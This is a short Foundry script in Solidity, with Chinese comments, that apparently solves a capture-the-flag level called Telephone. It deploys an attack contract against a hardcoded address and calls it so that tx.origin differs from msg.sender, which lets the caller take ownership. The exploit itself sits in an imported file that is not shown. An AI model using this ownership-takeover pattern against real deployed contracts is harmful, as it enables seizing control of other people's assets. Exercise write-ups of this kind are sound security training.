// script/TelephoneScript.s.sol
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/TelephoneAttack.sol";

contract TelephoneScript is Script {
    function run() external {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        address attacker = vm.addr(privateKey);
        
        vm.startBroadcast(privateKey);
        
        // 部署攻击合约
        TelephoneAttack attack = new TelephoneAttack(0xF79890ccb860424a5e91dae195Cf681052B30129);
        
        // 通过攻击合约调用，触发tx.origin != msg.sender
        attack.attack(attacker);
        
        vm.stopBroadcast();
    }
}